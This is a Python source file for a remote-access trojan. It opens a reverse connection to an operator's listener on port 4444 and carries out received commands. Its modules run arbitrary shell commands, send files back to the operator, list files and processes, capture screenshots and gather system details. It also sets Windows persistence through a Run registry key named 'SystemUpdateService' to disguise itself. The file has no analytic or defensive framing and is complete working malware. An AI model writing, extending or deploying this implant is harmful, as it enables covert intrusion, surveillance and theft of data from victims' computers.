import socket
import subprocess
import platform
import os
import struct
import time
import sys

def send_packet(sock, msg_bytes):
    sock.sendall(struct.pack('!I', len(msg_bytes)) + msg_bytes)

def module_sysinfo():
    try:
        info = f"[-] OS: {platform.system()} {platform.release()}\n[-] Node: {platform.node()}\n[-] Machine: {platform.machine()}\n[-] User: {os.getlogin() if hasattr(os, 'getlogin') else 'N/A'}"
        return info.encode('utf-8')
    except Exception as e:
        return f"[-] Error: {str(e)}".encode('utf-8')

def module_shell(arg):
    try:
        proc = subprocess.Popen(arg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = proc.communicate()
        res = out + err
        return res if res else b"[+] Command completed (no output)\n"
    except Exception as e:
        return f"[-] Shell Error: {str(e)}".encode('utf-8')

def module_file_list(path):
    try:
        if not path:
            path = "."
        files = os.listdir(path)
        res = "\n".join(files)
        return res.encode('utf-8')
    except Exception as e:
        return f"[-] List Error: {str(e)}".encode('utf-8')

def module_download(path):
    if os.path.exists(path):
        try:
            with open(path, 'rb') as f:
                return f.read()
        except Exception as e:
            return f"[-] Read Error: {str(e)}".encode('utf-8')
    else:
        return b"[-] Error: File not found."

def module_process_list():
    if platform.system() == "Windows":
        return module_shell("tasklist")
    else:
        return module_shell("ps aux")

def module_screenshot():
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        screenshot.save("temp_screen.png", "PNG")
        with open("temp_screen.png", "rb") as f:
            b = f.read()
        os.remove("temp_screen.png")
        return b
    except ImportError:
        return b"[-] Error: Pillow library not installed on target for screenshot."
    except Exception as e:
        return f"[-] Screenshot Error: {str(e)}".encode('utf-8')

def module_persistence():
    if platform.system() == "Windows":
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
                winreg.SetValueEx(reg_key, "SystemUpdateService", 0, winreg.REG_SZ, sys.executable)
            return b"[+] Persistence installed successfully via Registry Run key."
        except Exception as e:
            return f"[-] Persistence Error: {str(e)}".encode('utf-8')
    else:
        return b"[-] Persistence only supported on Windows in this module."

def run_agent():
    target_ip = "127.0.0.1"
    target_port = 4444

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))

            while True:
                cmd_bytes = s.recv(4096)
                if not cmd_bytes:
                    break
                command = cmd_bytes.decode('utf-8', errors='ignore').strip()
                
                if command.lower() == 'exit':
                    break

                parts = command.split(' ', 1)
                action = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""

                response = b""
                if action == 'sysinfo':
                    response = module_sysinfo()
                elif action == 'shell':
                    response = module_shell(arg)
                elif action == 'ls':
                    response = module_file_list(arg)
                elif action == 'download':
                    response = module_download(arg)
                elif action == 'ps':
                    response = module_process_list()
                elif action == 'screenshot':
                    response = module_screenshot()
                elif action == 'persist':
                    response = module_persistence()
                else:
                    response = module_shell(command)

                send_packet(s, response)
        except Exception:
            time.sleep(5)
            continue

if __name__ == '__main__':
    run_agent()